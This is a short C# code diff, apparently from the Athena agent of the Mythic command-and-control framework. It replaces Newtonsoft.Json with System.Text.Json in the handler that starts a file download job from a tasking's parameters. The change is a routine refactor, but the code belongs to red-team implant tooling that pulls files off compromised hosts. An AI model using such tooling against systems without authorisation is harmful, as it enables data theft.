@@ -5,8 +5,9 @@ using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
 using System.Threading.Tasks;
-using Newtonsoft.Json;
+
 using Athena.Plugins;
+using System.Text.Json;
 
 namespace Athena.Commands
 {
@@ -24,7 +25,7 @@ namespace Athena.Commands
         public async Task<DownloadResponse> StartDownloadJob(MythicJob job)
         {
             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
-            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+            Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
             downloadJob.path = par["File"].Replace("\"", String.Empty);
             downloadJob.total_chunks = await this.GetTotalChunks(downloadJob);
             this.downloadJobs.GetOrAdd(job.task.id, downloadJob);
